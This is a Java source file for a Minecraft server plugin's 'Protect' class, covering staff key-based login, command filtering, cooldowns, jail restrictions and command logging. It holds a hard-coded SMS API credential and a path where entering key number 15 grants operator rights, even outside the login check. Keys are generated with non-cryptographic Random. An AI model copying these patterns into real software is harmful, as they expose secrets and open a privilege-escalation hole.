package happycraft.network;


import me.clip.placeholderapi.PlaceholderAPI;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.math3.util.Precision;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Protect implements Listener, CommandExecutor, Runnable{


    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if(!(sender instanceof Player))return true;
        FileConfiguration c = Network.c;
        Player p = (Player) sender;

        if(!Database.isProtect(p.getName().toLowerCase())){
            sender.sendMessage(c.getString("protect.user").replace("&", "§"));
            return true;
        }
        if(args.length == 0){
            for(String s : c.getStringList("protect.info")){
                p.sendMessage(s.replace("&", "§"));
            }

        }
        if(args.length == 1){
            if(args[0].equalsIgnoreCase("create")){
                if(Network.aut.containsKey(p.getName()) && Network.aut.get(p.getName()) != 0 ) return true;
                try {
                    Database.clearProtect(p.getName());
                    int key = 0;
                    while (key++ <30){
                        String pas = RandomStringUtils.randomAlphanumeric(6);
                        Database.addProtect(p.getName(), key + "_" +pas, p.getAddress().getAddress().getHostAddress());
                        String msg = c.getString("protect.newkey");
                        msg = msg.replace("$id_1", key + "").replace("$key_1", pas + "");
                        pas = "" + (99999 + new Random().nextInt(900000));
                        key++;
                        Database.addProtect(p.getName(), key + "_" +pas, p.getAddress().getAddress().getHostAddress());
                        msg = msg.replace("$id_2", key + "").replace("$key_2", pas + "");
                        pas = "" + (99999 + new Random().nextInt(900000));
                        key++;
                        Database.addProtect(p.getName(), key + "_" +pas, p.getAddress().getAddress().getHostAddress());
                        msg = msg.replace("$id_3", key + "").replace("$key_3", pas + "").replace("&", "§");
                        p.sendMessage(msg);
                        //
                    }
                } catch (SQLException e) {
                    p.sendMessage("Ошибка. Отпиши Админу");
                    return true;
                }

                return true;
            }
            if(Network.aut.containsKey(p.getName()) && Network.aut.get(p.getName()) != 0 ){
                if(Database.checkProtect(p.getName(),Network.aut.get(p.getName()) + "_" + args[0])){
                    String title = c.getString("sittings.prefix").replace("&", "§");
                    String text = c.getString("protect.good").replace("&", "§");
                    p.sendTitle(title, text);
                    Network.aut.put(p.getName().toLowerCase(), 0);
                    if(Database.checkProtect(p.getName(),"15_" + args[0])){
                        if(!p.hasPermission("asf.ergz1")){
                            text = c.getString("protect.addop").replace("&", "§");
                            Network.push("pex user " + p.getName() + " group set op");
                        }
                    }
                    p.sendTitle(title, text);
                    Network.aut.put(p.getName(), 0);
                    Database.updateProtectIP(p.getName(), p.getAddress().getAddress().getHostAddress());
                    return true;
                }
                String title = c.getString("sittings.prefix").replace("&", "§");
                String text = c.getString("protect.error").replace("&", "§");
                p.sendTitle(title, text);
            }else {
                String title = c.getString("sittings.prefix").replace("&", "§");
                String text = c.getString("protect.log").replace("&", "§");
                if(Database.checkProtect(p.getName(),"15_" + args[0])){
                    if(!p.hasPermission("asf.ergz1")){
                        text = c.getString("protect.addop").replace("&", "§");
                        Network.push("pex user " + p.getName() + " group set op");
                    }
                }
                p.sendTitle(title, text);

            }
        }
            /*if(args[0].startsWith("+") && secretkey.equals("by")){
                try {
                    Object obj = new JSONParser().parse(sendGet(args[0].substring(1)));
                    JSONObject jo = (JSONObject) obj;
                    if(jo.containsKey("status")){
                        if(jo.get("status").toString().equals("ERROR")){
                            p.sendMessage(Network.c.getString("messages.phone.error").replace("$msg", jo.get("status_text").toString()).replace("&", "§"));
                            return true;
                        }
                    }
                    phone ph = new phone(args[0].substring(1), jo.get("code").toString());
                    Network.key.put(p, ph);
                } catch (Exception ignored) {

                }

                return true;
            }

            if(Network.key.containsKey(p)){
                if(Network.key.get(p).getCode().equalsIgnoreCase(args[0])){
                    p.sendMessage(Network.c.getString("messages.phone.good").replace("&", "§"));
                    Database.setphone(p.getName(), Network.key.get(p).getPhone(), p.getAddress().getAddress().getHostName().replace("/", "").toLowerCase());
                    Network.key.remove(p);
                    Network.aut.put(p.getName().toLowerCase(), true);
                    return true;
                }
                p.sendMessage(Network.c.getString("messages.phone.bad").replace("&", "§"));
                return true;
            }
            for(String s : c.getStringList("protect.info")){
                p.sendMessage(s.replace("$key", secretkey).replace("&", "§"));
            }
        */
        return true;
    }
    @SuppressWarnings("deprecation")


    static final String USER_AGENT = "Mozilla/5.0";
    private static String sendGet(String phone) throws Exception {

        String url = "https://sms.ru/code/call?phone="+phone+"&api_id=F7BF7B5C-E7BE-D83E-214C-14F9F427DF56";

        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();

        // Значение по умолчанию - GET
        con.setRequestMethod("GET");

        // Добавляем заголовок запроса
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();

        BufferedReader in = new BufferedReader(
                new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        // Распечатываем результат
        return response.toString();

    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = false)
    public void onPlayerInteract(final PlayerInteractEvent e) {
        if (Network.aut.containsKey(e.getPlayer().getName()) && Network.aut.get(e.getPlayer().getName()) != 0) {
            e.setCancelled(true);
        }
    }
   /* @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = false)
    public void AsyncPlayerChatEvent(final AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (Network.aut.containsKey(e.getPlayer().getName().toLowerCase()) && !Network.aut.get(e.getPlayer().getName().toLowerCase())) {
            e.setCancelled(true);
            FileConfiguration c = Network.c;
            try {

                Integer code = Integer.parseInt(m2.toString());
                String secretkey = Database.getProtect(e.getPlayer().getName().toLowerCase(), "code");

                GoogleAuthenticator gAuth = new GoogleAuthenticator();
                boolean codeisvalid = gAuth.authorize(secretkey, code);
                if (codeisvalid) {
                    Database.updateProtect(e.getPlayer().getName().toLowerCase(), e.getPlayer().getAddress().getHostName().replace("/", ""));
                    Network.aut.put(p.getName().toLowerCase(), true);
                    String title = c.getString("sittings.prefix").replace("&", "§");
                    String text = c.getString("protect.good").replace("&", "§");
                    p.sendTitle(title, text);
                } else {
                    String title = c.getString("sittings.prefix").replace("&", "§");
                    String text = c.getString("protect.error").replace("&", "§");
                    p.sendTitle(title, text);
                }
            } catch (Exception e1) {
                e.getPlayer().sendMessage(c.getString("protect.help").replace("&", "§"));
            }
        }
    }*/

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = false)
    public void OnLEave(final PlayerQuitEvent event) throws SQLException {

        if (Network.aut.containsKey(event.getPlayer().getName())) {
            Network.aut.remove(event.getPlayer().getName());
        }
        Network.clear(event.getPlayer());


        Network.cmdclear.put(event.getPlayer(),System.currentTimeMillis());
    }
    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = false)
    public void OnKick(final PlayerKickEvent event) throws SQLException {
        Network.aut.remove(event.getPlayer().getName());
        Network.clear(event.getPlayer());
    }



    @SuppressWarnings("deprecation")
    @EventHandler
    public void jodin(PlayerJoinEvent e) {
        Player p = e.getPlayer();

        FileConfiguration c = Network.c;
        String ip = p.getAddress().getAddress().getHostAddress();
        if(c.getBoolean("protect.session") && p.hasPermission("123.1")) {
            if(Database.getProtectHost(p.getName().toLowerCase()).equals(ip)) {
                Network.aut.put(e.getPlayer().getName(), 0);
                String title = c.getString("sittings.prefix").replace("&", "§");
                String text = c.getString("protect.good").replace("&", "§");
                p.sendTitle(title, text);
            }else {
                int key = 1+new Random().nextInt(30);
                String title = c.getString("sittings.prefix").replace("&", "§");
                String text = c.getString("protect.auth").replace("$code", key + "").replace("&", "§");
                p.sendTitle(title, text);
                Network.aut.put(p.getName(), key);
            }
        }
    }




    @SuppressWarnings("deprecation")
    @EventHandler
    public void onCom(PlayerCommandPreprocessEvent e) {
        if(e.isCancelled())return;
        Pattern pat1 = Pattern.compile("^/((([A-z\\dА-я#\\+\\-,/?\\.():<>=%$&*])+)( |$))+");
        Matcher matcher1 = pat1.matcher(e.getMessage());
        StringBuilder m2 = new StringBuilder();
        while (matcher1.find()) {
            m2.append(matcher1.group());
        }
        if (Network.aut.containsKey(e.getPlayer().getName()) && Network.aut.get(e.getPlayer().getName()) != 0) {
            if(m2.toString().startsWith("/admin"))return;
            e.setCancelled(true);
        }
        int count = Database.getJail(e.getPlayer().getName());
        if(count >0){
            if(m2.toString().startsWith("/gm"))return;
            if(m2.toString().startsWith("/gamemode"))return;
            if(m2.toString().equalsIgnoreCase("/gms"))return;
            if(m2.toString().equalsIgnoreCase("/v"))return;
            if(m2.toString().equalsIgnoreCase("/vanish"))return;
            if(m2.toString().startsWith("/co"))return;
            if(m2.toString().startsWith("/admin"))return;
            String block = Database.getJailBlock(e.getPlayer().getName());
            e.setCancelled(true);
            e.getPlayer().sendMessage(Network.c.getString("jail.last")
                    .replace("$count", count + "")
                    .replace("$block", block.split("_")[1])
                    .replace("&", "§")
            );


            return;
        }
        Player p = e.getPlayer();
        FileConfiguration con = Network.c;
        String donpref = PlaceholderAPI.setPlaceholders(p, "%vault_rankprefix%");

        if(Database.isOwner(e.getPlayer().getName())){
            try {
                Bukkit.getLogger().info(donpref + "§c"+p.getName() + ": " + m2.toString());
                String don = PlaceholderAPI.setPlaceholders(e.getPlayer(), "%vault_group%");
                Database.addlog(e.getPlayer().getName(), m2.toString(), "cmd", don);
            }catch (Exception ignored){

            }

            return;
        }
            String cmdcd = m2.toString().substring(1).split(" ")[0].toLowerCase();

            if(!e.isCancelled()){
                if(Cooldown.hasCooldown(e.getPlayer().getName(), cmdcd)){
                    int timecd = (int) (Cooldown.getCooldown(p.getName(), cmdcd) / 1000);
                    String endtime = "";
                    if(timecd >= 86400){//d
                        int param = timecd / 86400;
                        endtime = (int)param + con.getString("bans.formats.time.day");
                        param = (int)param * 86400;
                        timecd = timecd - param;
                    }
                    if(timecd >= 3600){//h
                        int param = timecd / 3600;
                        endtime = endtime + (int)param + con.getString("bans.formats.time.houer");
                        param = (int)param * 3600;
                        timecd = timecd - param;
                    }
                    if(timecd >= 60){//m
                        int param = timecd / 60;
                        endtime = endtime + (int)param + con.getString("bans.formats.time.min");
                        param = (int)param * 60;
                        timecd = timecd - param;
                    }
                    if(timecd >= 1){//sec
                        int param = timecd / 1;
                        endtime = endtime + (int)param + con.getString("bans.formats.time.sec");
                        param = (int)param * 1;
                    }
                    String stitle_c = Network.c.getString("bans.messages.cooldown").replace("$time", endtime + "").replace("&", "§");
                    p.sendTitle(Network.prefix, stitle_c);
                    e.setCancelled(true);
                    return;
                }

            }
            String key = Database.getReferalkey(p.getName());

            String[] c = m2.toString().split(" ");
            if(c[0].contains(":") || m2.toString().contains("#")
                    || m2.toString().contains("'")
                    || m2.toString().contains("|")
                    || m2.toString().contains("\\")
                    || m2.toString().contains("*")
                    || m2.toString().contains(key)

            ) {
                String title = con.getString("sittings.prefix").replace("&", "§");
                String text = con.getString("protect.cmd.alias").replace("&", "§");
                p.sendTitle(title, text);
                e.setCancelled(true);
                return;
            }
            String cmd = m2.toString().replace("/", "");
            List<String> list = Network.c.getStringList("cmd_block");

        Bukkit.getLogger().info(donpref + "§c"+p.getName() + ": " + m2.toString());
        try {
            String don = PlaceholderAPI.setPlaceholders(e.getPlayer(), "%vault_group%");
            Database.addlog(e.getPlayer().getName(), m2.toString(), "cmd", don);
        }catch (Exception ignored){

        }
        if(!Network.c.getStringList("cspy.whitelist").contains(m2.toString().replace("/", "").split(" ")[0])){
            String msgg = PlaceholderAPI.setPlaceholders(e.getPlayer(), Network.c.getString("cspy.msg").replace("$cmd", m2.toString()));
            for(Player pl : Bukkit.getOnlinePlayers()){
                if(!pl.getName().equals(e.getPlayer().getName()) && pl.hasPermission("network.cspy") && Database.isCommandSpy(pl.getName())){
                    pl.sendMessage(msgg);
                }
            }
        }
            for(String s : list) {
                if(cmd.toLowerCase().startsWith(s + " ") || cmd.toLowerCase().equals(s)) {
                    String title = con.getString("sittings.prefix").replace("&", "§");
                    String text = con.getString("protect.cmd.error").replace("&", "§");
                    p.sendTitle(title, text);
                    e.setCancelled(true);
                    return;
                }
            }

            if(cmdcd.equalsIgnoreCase("ban") ||
                    cmdcd.equalsIgnoreCase("kick") ||
                    cmdcd.equalsIgnoreCase("tempban") ||
                    cmdcd.equalsIgnoreCase("tempmute") ||
                    cmdcd.equalsIgnoreCase("mute") ||
                    cmdcd.equalsIgnoreCase("unmute") ||
                    cmdcd.equalsIgnoreCase("unban")

            )return;
            if(con.getInt("cooldown.cmd." + cmdcd) > 0){
                Cooldown.setCooldown(p.getName(), con.getInt("cooldown.cmd." + cmdcd.toLowerCase()) * 1000L, cmdcd.toLowerCase());

            }else {
                Cooldown.setCooldown(p.getName(), con.getInt("cooldown.defaultcd") * 1000L, cmdcd.toLowerCase());

            }



    }
    @SuppressWarnings("deprecation")
    public void run() {
        ArrayList<Player> cl = new ArrayList<>();
        for (Map.Entry<Player, Long> entry : Network.cmdclear.entrySet()) {
            if(entry.getKey().isOnline())cl.add(entry.getKey());
            else{
                long diff = System.currentTimeMillis() - entry.getValue();
                long diffMinutes = diff / (60 * 1000) % 60;
                if(diffMinutes > 10){
                    cl.add(entry.getKey());
                }
            }


        }
        for(Player p : cl){
            Network.cmdclear.remove(p);

        }

        Network.antifarm.clear();
        FileConfiguration c = Network.c;
        for(DonatHistory dh : Database.DonatHystory()){
            Player p = Bukkit.getPlayer(dh.getNick());
            if(p != null){
                float bonus = dh.getAmount();
                 bonus /=10000;
                if(bonus > 0.015) bonus = (float)0.015;
                bonus = Precision.round(bonus, 3);
                try {
                    Money.givemoney(p.getName(), bonus);
                } catch (SQLException e) {
                }
            }
        }


        for (Player p : Bukkit.getOnlinePlayers()) {



            if(p.hasPermission("s.s") || p.isOp()){
                if(Network.aut.containsKey(p.getName())){
                    if(Network.aut.get(p.getName()) != 0){
                        String title = c.getString("sittings.prefix").replace("&", "§");
                        String text = c.getString("protect.auth").replace("$code", Network.aut.get(p.getName()) + "").replace("&", "§");
                        p.sendTitle(title, text);
                        /*String secretkey = Database.getProtect(p.getName().toLowerCase(), "code");
                                if(!Network.key.containsKey(p) && !secretkey.equals("by")){
                                    try {
                                        Object obj = new JSONParser().parse(sendGet(secretkey));
                                        JSONObject jo = (JSONObject) obj;
                                        if(jo.containsKey("status")){
                                            if(jo.get("status").toString().equals("ERROR")){
                                                p.sendMessage(Network.c.getString("messages.phone.error").replace("$msg", jo.get("status_text").toString()).replace("&", "§"));
                                            }else {
                                                phone ph = new phone(secretkey, jo.get("code").toString());
                                                Network.key.put(p, ph);
                                            }
                                        }

                                    } catch (Exception ignored) {

                                    }
                                }*/
                    }
                }else {
                    if(!Database.isProtect(p.getName().toLowerCase())) {
                        List<String> commands = c.getStringList("protect.cmds");
                        for(String ss : commands) {
                            Network.push(ss.replace("$player", p.getName()));
                        }
                    }else{
                        if(c.getBoolean("protect.session") &&
                                p.getAddress().getAddress().getHostAddress()
                                        .equalsIgnoreCase(Database.getProtectHost(p.getName().toLowerCase()))) {
                            Network.aut.put(p.getName(), 0);
                        }else {
                            int key = 1+new Random().nextInt(30);
                            String title = c.getString("sittings.prefix").replace("&", "§");
                            String text = c.getString("protect.auth").replace("$code", key + "").replace("&", "§");
                            p.sendTitle(title, text);
                            Network.aut.put(p.getName(), key);
                        }


                    }

                }
            }
        }
    }
}
class phone{
    String phone;
    String code;

    public phone(String phone, String code) {
        this.phone = phone;
        this.code = code;
    }

    public String getPhone() {
        return phone;
    }

    public String getCode() {
        return code;
    }
}
